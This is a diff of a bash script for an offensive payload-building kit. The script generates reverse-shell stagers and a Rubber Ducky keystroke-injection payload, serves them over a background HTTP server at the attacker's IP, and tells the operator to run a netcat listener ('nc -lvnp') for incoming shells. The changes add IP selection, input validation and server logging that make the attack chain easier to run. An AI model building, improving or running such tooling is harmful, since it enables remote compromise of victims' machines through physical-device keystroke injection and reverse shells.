@@ -44,17 +44,38 @@ STAGERS_DIR="stagers"
 mkdir -p "$OUTPUT_DIR" "$WEB_DIR" "$PAYLOADS_DIR" "$STAGERS_DIR/config"
 
 # ---------------------[ GET NETWORK IP ]--------------------
-log "Available local IP addresses:"
-mapfile -t ip_list < <(hostname -I | tr ' ' '\n' | grep -v '^$')
-for i in "${!ip_list[@]}"; do echo "  [$i] ${ip_list[$i]}"; done
-read -p "[*] Choose IP [index]: " ip_index
-IP="${ip_list[$ip_index]:-127.0.0.1}"
+log "Available local IPv4 addresses:"
+
+# Filter only IPv4 addresses
+mapfile -t ip_list < <(hostname -I | tr ' ' '\n' | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$')
+
+# Show options to the user
+for i in "${!ip_list[@]}"; do
+    echo "  [$i] ${ip_list[$i]}"
+done
+
+# Safe input for IP index
+while true; do
+    read -p "[*] Choose IP [index]: " ip_index
+    if [[ "$ip_index" =~ ^[0-9]+$ ]] && (( ip_index >= 0 && ip_index < ${#ip_list[@]} )); then
+        IP="${ip_list[$ip_index]}"
+        break
+    else
+        echo "Invalid index. Please enter a number from 0 to $((${#ip_list[@]}-1))."
+    fi
+done
+
+echo "Selected IP: $IP"
 
 read -p "[*] Enter PORT for reverse shell/payload (default 8000): " PORT_SHELL
 PORT_SHELL="${PORT_SHELL:-8000}"
 
 read -p "[*] Enter PORT for web server (default 8080): " PORT_SERVE
 PORT_SERVE="${PORT_SERVE:-8080}"
+
+echo "Reverse shell/payload port: $PORT_SHELL"
+echo "Web server port: $PORT_SERVE"
+
 
 # --------------------[ CHECK PORTS & KILL PROCESSES ]--------
 free_port() {
@@ -144,15 +165,20 @@ cp "$FINAL_STAGE1" "$WEB_DIR/$FINAL_STAGE1_WEB"
 log "Generating Ducky payload..."
 python3 tools/generate_ducky.py "$IP" "$PORT_SERVE" 1000 "$OUTPUT_DIR/ducky_payload.txt" "$OS"
 
-# -----------------[ PORT CONTROL & SERVE ]-------------------
+# -------------------[ PORT CONTROL & SERVE ]------------------
+
+# Serve the web directory with python HTTP server in background,
+# redirect output to a log file for clean terminal view.
 serve_web() {
   cd "$WEB_DIR"
   log "Serving payloads at http://$IP:$PORT_SERVE"
-  python3 -m http.server "$PORT_SERVE" --bind 0.0.0.0 &
+  python3 -m http.server "$PORT_SERVE" --bind 0.0.0.0 > ../output/http_server.log 2>&1 &
+  SERVER_PID=$!
   cd "$PROJECT_DIR"
 }
 
 serve_web
+sleep 1  # Give server a moment to start
 
 # --------- [ build_history.log ] ---------
 echo "[$(date)] $IP $PORT_SHELL $PORT_SERVE $OS $PAYLOAD $DELIVERY" >> build_history.log
@@ -178,8 +204,16 @@ cat > "$CONFIG_FILE" <<EOF
 }
 EOF
 
-log "Payload ready."
-log "Serve URL: http://$IP:$PORT_SERVE/"
-log "Direct download URL: http://$IP:$PORT_SERVE/$FINAL_STAGE1_WEB"
-log "Ducky payload saved: $OUTPUT_DIR/ducky_payload.txt"
-log "To listen for incoming connection, run: nc -lvnp $PORT_SHELL"
+# ---------------[ FINAL INFO BLOCK ]--------------------------
+
+log "Payload is ready and being served in background."
+log "----------------------------------------------------"
+log "  Serve URL:          http://$IP:$PORT_SERVE/"
+log "  Direct download:    http://$IP:$PORT_SERVE/$FINAL_STAGE1_WEB"
+log "  Ducky payload:      $OUTPUT_DIR/ducky_payload.txt"
+log "----------------------------------------------------"
+log "To listen for an incoming connection, run:"
+echo -e "\e[1;36mnc -lvnp $PORT_SHELL\e[0m"
+log "To stop the web server, run:"
+echo -e "\e[1;36mkill $SERVER_PID\e[0m"
+log "HTTP server logs are saved to: output/http_server.log"
